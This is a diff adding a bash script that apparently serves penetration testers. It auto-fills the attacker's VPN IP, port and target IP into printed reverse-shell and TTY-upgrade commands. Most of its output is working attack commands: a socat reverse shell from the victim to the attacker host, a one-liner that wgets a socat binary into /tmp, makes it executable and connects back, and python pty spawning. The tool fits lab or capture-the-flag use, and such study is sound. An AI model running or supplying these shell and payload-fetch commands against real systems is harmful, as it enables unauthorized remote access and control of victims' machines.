@@ -1,0 +1,48 @@
+#!/bin/bash
+
+RESET="\033[0m"
+Green="\033[0;32m"
+Yellow='\033[0;33m'
+Red='\033[0;31m' 
+BGreen='\033[1;32m' # Bold Green
+BYellow='\033[1;33m' # Bold Yellow
+BRed='\033[1;31m' # Bold Red
+
+# Make port number bold, so the pentester can notice it
+if [ -z $1 ]; then
+    LPORT=${BYellow}'443'${Yellow}
+else
+    LPORT=${BYellow}$1${Yellow}
+fi
+
+# Get current VPN IP if tun0 is set
+LHOST=$(ifconfig | grep -A1 tun0 | grep inet | awk '{print $2}')
+if [ -z $LHOST ]; then
+    LHOST=${BRed}'IP'${Yellow}
+else
+    LHOST=${BYellow}${LHOST}${Yellow}
+fi
+
+# Get current target IP if set
+RHOST=$(show-target-ip)
+if [ -z $RHOST ]; then
+    RHOST=${BRed}'TARGET-IP'${Yellow}
+fi
+
+echo -e "${BGreen}PYTHON${RESET}"
+echo -e "${Yellow}python -c 'import pty; pty.spawn(\"/bin/bash\")'${RESET}"
+
+echo -e "\n${BGreen}SOCAT${RESET}"
+echo -e "--> Get the binary from https://github.com/andrew-d/static-binaries/raw/master/binaries/linux/x86_64/socat"
+echo -e "Listener/Server: ${Yellow}socat file:`tty`,raw,echo=0 tcp-listen:${LPORT}${RESET}"
+echo -e "Client/Victim:   ${Yellow}socat exec:'bash -li',pty,stderr,setsid,sigint,sane tcp:${LHOST}${Yellow}:${LPORT}${RESET}"
+echo -e "Client+Download: ${Yellow}wget -q ${LHOST}/<path_to_socat_binary> -O /tmp/socat; chmod +x /tmp/socat; /tmp/socat exec:'bash -li',pty,stderr,setsid,sigint,sane tcp:${LHOST}${Yellow}:${LPORT}${RESET}"
+
+
+echo -e "\n${BGreen}NETCAT${RESET}"
+echo -e "1. Use python to spawn a PTY that runs Bash.\n2. Use CTRL+Z to background the shell on Kali."
+echo -e "--> Follow the instructions from https://blog.ropnop.com/upgrading-simple-shells-to-fully-interactive-ttys/"
+
+echo -e "\n${BGreen}BASH${RESET}"
+echo -e "${Yellow}SHELL=/bin/bash script -q /dev/null${RESET}"
+
